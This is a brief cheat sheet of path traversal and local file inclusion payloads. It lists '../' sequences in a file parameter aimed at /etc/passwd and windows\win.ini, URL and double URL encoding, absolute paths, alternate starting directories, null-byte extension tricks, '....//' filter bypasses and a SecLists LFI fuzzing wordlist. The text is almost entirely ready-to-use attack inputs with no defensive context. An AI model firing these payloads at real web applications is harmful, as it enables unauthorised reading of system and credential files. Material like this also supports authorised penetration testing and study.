# Method
1.Standard Path Treversal via file Parameter
	?file= ../../../../etc/passwd 
	?file=..\..\..\windows\win.ini
	?file=WordlistFUZZ:\SecLists\SecLists-master\Fuzzing\LFI
2. Url encode %2e%2e%2f Double URL encode
3. Absolute path:
	?file=/etc/passwd
4. Different Starting Points:
	/var/www/images/../../../../etc/passwd
5.Different Payloads
	Url encoded 
	Nullbytes %00
	Nullbyte extension file%00.jpg (different extensions)
	double ....//
	